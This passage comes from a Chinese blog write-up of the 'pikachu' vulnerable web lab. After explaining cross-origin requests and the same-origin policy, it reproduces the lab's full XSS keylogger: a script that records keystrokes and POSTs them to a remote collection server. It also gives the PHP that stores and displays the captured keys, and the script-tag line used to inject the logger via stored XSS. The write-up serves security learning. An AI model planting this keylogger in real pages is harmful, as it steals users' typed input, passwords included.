fa-external-link-alt"></i></a><br>其中，协议（https:&#x2F;&#x2F;）、子域名（fanyi）、主域名（baidu.com）、端口（未显示，即默认的80端口）、资源地址（#en&#x2F;zh&#x2F;admin）。<br>当这些组合间存在任一不同时，则形成不同域，而不同域间请求数据被称为跨域。</p><ul><li>都了解了跨越，那也了解下–同源策略</li></ul><p>出于安全考虑，各浏览器间约定同源策略，即不同域间不允许相互使用 JavaScript 操作。总有那么一些需要，导致跨域操作的出现，下边举几个例子：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;...&quot;</span>&gt;		# script 标签，定义客户端脚本，包含脚本语句，或使用 src 属性写入外部脚本文件</span><br><span class="line">&lt;img src=<span class="string">&quot;...&quot;</span>&gt;			# img 标签，加载图片</span><br><span class="line">&lt;link href=<span class="string">&quot;...&quot;</span>&gt;		# link 标签，加载 css 代码</span><br><span class="line">&lt;iframe src=<span class="string">&quot;...&quot;</span>&gt;		# iframe 标签，在当前 <span class="variable constant_">HTML</span> 文档中嵌入另一个文档</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://192.168.135.130:49154/pkxss/rkeypress/rkserver.php 源码</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by runner.han</span></span><br><span class="line"><span class="comment"> * There is nothing new under the sun</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置允许被跨域访问</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin:*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;datax&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;insert keypress(data) values(&#x27;<span class="subst">$data</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"># <span class="attr">http</span>:<span class="comment">//192.168.135.130:49154/pkxss/rkeypress/rk.js 源码</span></span><br><span class="line">#</span><br><span class="line"># 实现获取键盘记录的js脚本</span><br><span class="line">#</span><br><span class="line"># 存储型xss处写入如下语句：</span><br><span class="line">&lt;script src= <span class="string">&quot;http://192.168.135.130:49154/pkxss/rkeypress/rk.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"># 似乎没啥呀？<span class="variable constant_">F12</span>一波，发现我们的js脚本执行报错：</span><br><span class="line"><span class="title class_">ReferenceError</span>: event is not defined</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//192.168.135.130:49154/pkxss/rkeypress/rk.js</span></span><br><span class="line"><span class="title class_">Line</span> <span class="number">34</span></span><br><span class="line"># 就这行的内容：</span><br><span class="line"><span class="keyword">var</span> realkey = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(event.<span class="property">keyCode</span>);</span><br><span class="line"># event 未定义？不了解js，找度娘玩呗：</span><br><span class="line"># 度娘说：<span class="title class_">FireFox</span>没有 <span class="variable language_">window</span>.<span class="property">event</span></span><br><span class="line"># 其他网友说 onkeypress 函数内加下面这句话：</span><br><span class="line"><span class="keyword">var</span> event = <span class="variable language_">window</span>.<span class="property">event</span> || <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>.<span class="property">arguments</span>[<span class="number">0</span>];</span><br><span class="line"># 恭喜，得到一个新错误：<span class="title class_">TypeError</span>: <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span> is <span class="literal">null</span></span><br><span class="line"># 继续，似乎说是严格模式下报错，火狐不支持callee、caller的+用法</span><br><span class="line"># ……找不到门径，放弃使用<span class="title class_">FireFox</span>，拿<span class="title class_">Google</span>访问吧。</span><br><span class="line"># 测试发现，仅在英文模式下输入有效，中文没用呀，</span><br><span class="line"></span><br><span class="line"># 看了下，还是理解一波先</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	IE7+、Firefox、Chrome、Safari 以及 Opera 内建 XMLHttpRequest 对象</span></span><br><span class="line"><span class="comment">	使用js创建ajax对象时，通过 window.XMLHttpRequest 进行判断。</span></span><br><span class="line"><span class="comment">  XMLHttpRequest 对象用于在后台与服务器交换数据。</span></span><br><span class="line"><span class="comment">  XMLHttpRequest 的 overrideMimeType 方法是指定一个MIME类型用于替代服务器指定的类型，使服务端响应信息中传输的数据按照该指定MIME类型处理。即针对某些特定版本的mozillar浏览器的BUG进行修正，使正常运行。</span></span><br><span class="line"><span class="comment">  request.overrideMimeType(&#x27;text/xml&#x27;); 语句将覆盖发送给服务器的头部，强制 text/xml 作为 mime-type。</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  老版本的 Internet Explorer （IE5 和 IE6）使用 ActiveX 对象</span></span><br><span class="line"><span class="comment">  window.ActiveXObject 用来判断浏览器是否支持ActiveX控件</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	说下我的理解：</span></span><br><span class="line"><span class="comment">  自定义 createAjax() 函数用于创建 XMLHttpRequest 对象，根据兼容性使用不同的方法创建。</span></span><br><span class="line"><span class="comment">  如通过 window.XMLHttpRequest 判读是否内置 XMLHttpRequest ；没有再通过 window.ActiveXObject 判断 ActiveXObject 的内置</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  自定义 onkeypress() 函数用于监听键盘事件。</span></span><br><span class="line"><span class="comment">  其中，使用到 fromCharCode() 函数，这也是为什么不能使用中文输入法的原因。</span></span><br><span class="line"><span class="comment">  将获取的键入值不断拼接 xl ，实现键盘记录。</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  自定义 show() 函数，先调用 函数创建 。</span></span><br><span class="line"><span class="comment">  其中，内部又定义了一个匿名函数，进行请求的各种判断：</span></span><br><span class="line"><span class="comment">  如 ajax.readyState == 4 服务器响应完成</span></span><br><span class="line"><span class="comment">  ajax.status == 200 请求成功处理</span></span><br><span class="line"><span class="comment">  ajax.responseText 读取服务器返回的内容</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  最后</span></span><br><span class="line"><span class="comment">  利用 open() 打开我们的远程服务器进行数据的存储</span></span><br><span class="line"><span class="comment">  通过 setRequestHeader 设置请求头</span></span><br><span class="line"><span class="comment">  利用 send() 把获取到的数据发送远程服务器</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">  还是看一下 Ajax 的 XMLHttpRequest 对象的功能吧</span></span><br><span class="line"><span class="comment">  - 在不重新加载页面的情况下更新网页</span></span><br><span class="line"><span class="comment">	- 在页面已加载后从服务器请求数据</span></span><br><span class="line"><span class="comment">	- 在页面已加载后从服务器接收数据</span></span><br><span class="line"><span class="comment">	- 在后台向服务器发送数据</span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by runner on 2018/7/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createAjax</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> request=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>)&#123;</span><br><span class="line">        request=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="keyword">if</span>(request.<span class="property">overrideMimeType</span>)&#123;</span><br><span class="line">            request.<span class="title function_">overrideMimeType</span>(<span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> versions=[<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>, <span class="string">&#x27;MSXML.XMLHTTP&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.7.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.6.0&#x27;</span>,<span class="string">&#x27;Msxml2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;Msxml2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;versions.<span class="property">length</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                request=<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(versions[i]);</span><br><span class="line">                <span class="keyword">if</span>(request)&#123;</span><br><span class="line">                    <span class="keyword">return</span> request;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">                request=<span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> request;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ajax=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> xl=<span class="string">&quot;datax=&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">onkeypress</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> realkey = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(event.<span class="property">keyCode</span>);</span><br><span class="line">    xl+=realkey;</span><br><span class="line">    <span class="title function_">show</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">onkeypress</span> = onkeypress;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    ajax = <span class="title function_">createAjax</span>();</span><br><span class="line">    ajax.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (ajax.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ajax.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> data = ajax.<span class="property">responseText</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;页面请求失败&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> postdate = xl;</span><br><span class="line">    ajax.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://192.168.1.15/pkxss/rkeypress/rkserver.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-length&quot;</span>, postdate.<span class="property">length</span>);</span><br><span class="line">    ajax.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Connection&quot;</span>, <span class="string">&quot;close&quot;</span>);</span><br><span class="line">    ajax.<span class="title function_">send</span>(postdate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://192.168.135.130:49154/pkxss/rkeypress/pkxss_keypress_result.php 源码</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 接受键盘输入界面</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断是否登录，没有登录不能访问</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">check_login</span>(<span class="variable">$link</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:../pkxss_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;delete from keypress where id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;键盘记录结果&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;../antxss.css&quot;</span> /&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;title&quot;</span>&gt;</span><br><span class="line">&lt;h1&gt;pikachu Xss 获取键盘记录结果&lt;/h1&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;../xssmanager.php&quot;</span>&gt;返回首页&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;xss_main&quot;</span>&gt;</span><br><span class="line">&lt;table border=<span class="string">&quot;1px&quot;</span> cellpadding=<span class="string">&quot;10&quot;</span> cellspacing=<span class="string">&quot;1&quot;</span> bgcolor=<span class="string">&quot;#5f9ea0&quot;</span>&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;id&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;记录&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;操作&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select * from keypress&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&lt;&lt;&lt;A</span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;id&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;<span class="subst">&#123;$data[&#x27;data&#x27;]&#125;</span>&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&lt;a href=&quot;pkxss_keypress_result.php?id=<span class="subst">&#123;$data[&#x27;id&#x27;]&#125;</span>&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;</span></span><br><span class="line"><span class="string">A</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$html</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><blockquote><ul><li>练着是那么回事，写着又是那么回事，总觉得太乱了。</li><li>笔者感觉，整体打完一个靶场和到处打一下效果是截然不同的，更容易可看出不足。</li><li>人生短暂，且行且努力，加油~</li></ul></blockquote></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul class="copyright-info-content"><li><span class="type">本文标题</span>：<span class="content">pikachu_全通关笔记_含源码解析</span></li><li><span class="type">本文作者</span>：<span class="content">涂寐</span></li><li><span class="type">创建时间</span>：<span class="content">2022-01-20 23:55:52</span></li><li class="post-link"><span class="type">本文链接</span>：<span class="content">article/39c9e418.html</span></li><li><span class="type">版权声明</span>：<span class="content">本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！</span></li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/pikachu/">#pikachu</a>&nbsp;</li><li class="tag-item"><a href="/tags/success/">#通关</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/article/d35d1b94.html"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">爬虫之异步相关</span> <span class="post-nav-item">上一篇</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/article/10a5a8a4.html"><span class="title flex-center"><span class="post-nav-title-item">安鸾之XXE漏洞</span> <span class="post-nav-item">下一篇</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;评论</div><div class="valine-container"><script data-pjax src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><div id="vcomments"></div><script data-pjax>function loadValine(){function e(e){switch(e){case"en":return"Author";case"zh-CN":return"博主";default:return"Master"}}new Valine({el:"#vcomments",appId:"FrcGiaBdfMQqXAnDFY1gwHbS-gzGzoHsz",appKey:"C0Wy6Sfq0qVag0nm59fc1D12",meta:["nick","mail","link"],avatar:"wavatar",enableQQ:!0,placeholder:"道友，请留步！请留言~",lang:"zh-CN".toLowerCase()});const a=setInterval(()=>{const n=document.querySelectorAll("#vcomments .vcards .vcard");if(n.length>0){let t="涂寐";if(t)for(let a of n){const n=a.querySelector(".vhead .vnick"),l=n.innerHTML;l===t&&(n.innerHTML=`${l} <span class="author">${e(KEEP.hexo_config.language)}</span>`)}clearInterval(a)}else clearInterval(a)},2e3)}{const e=setTimeout(()=>{loadValine(),clearTimeout(e)},1e3)}</script></div></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="nav-number">2.</span> <span class="nav-text">系统敏感文件路径</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x2F-x2F"><span class="nav-number">3.</span> <span class="nav-text">..&#x2F;..&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">3.1.</span> <span class="nav-text">目录遍历</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">4.</span> <span class="nav-text">敏感信息泄露</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IcanseeyourABC"><span class="nav-number">4.1.</span> <span class="nav-text">IcanseeyourABC</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">5.</span> <span class="nav-text">暴力破解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%A1%A8%E5%8D%95%E7%9A%84%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="nav-number">5.1.</span> <span class="nav-text">基于表单的暴力破解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-server"><span class="nav-number">5.2.</span> <span class="nav-text">验证码绕过(on server)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87-on-client-%E4%B8%8Etoken%E9%98%B2%E7%88%86%E7%A0%B4"><span class="nav-number">5.3.</span> <span class="nav-text">验证码绕过(on client) 与token防爆破?</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE"><span class="nav-number">6.</span> <span class="nav-text">RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exec-%E2%80%9Cping%E2%80%9D"><span class="nav-number">6.1.</span> <span class="nav-text">exec “ping”</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exec-%E2%80%9Cevel%E2%80%9D"><span class="nav-number">6.2.</span> <span class="nav-text">exec “evel”</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#File-Inclusion"><span class="nav-number">7.</span> <span class="nav-text">File Inclusion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Inclusion-local"><span class="nav-number">7.1.</span> <span class="nav-text">File Inclusion(local)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#File-Inclusion-remote"><span class="nav-number">7.2.</span> <span class="nav-text">File Inclusion(remote)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsafe-Filedownload"><span class="nav-number">8.</span> <span class="nav-text">Unsafe Filedownload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unsafe-Fileupload"><span class="nav-number">9.</span> <span class="nav-text">Unsafe Fileupload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#client-check"><span class="nav-number">9.1.</span> <span class="nav-text">client check</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MIME-type"><span class="nav-number">9.2.</span> <span class="nav-text">MIME type</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#getimagesize"><span class="nav-number">9.3.</span> <span class="nav-text">getimagesize</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Over-Permission"><span class="nav-number">10.</span> <span class="nav-text">Over Permission</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83"><span class="nav-number">10.1.</span> <span class="nav-text">水平越权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83"><span class="nav-number">10.2.</span> 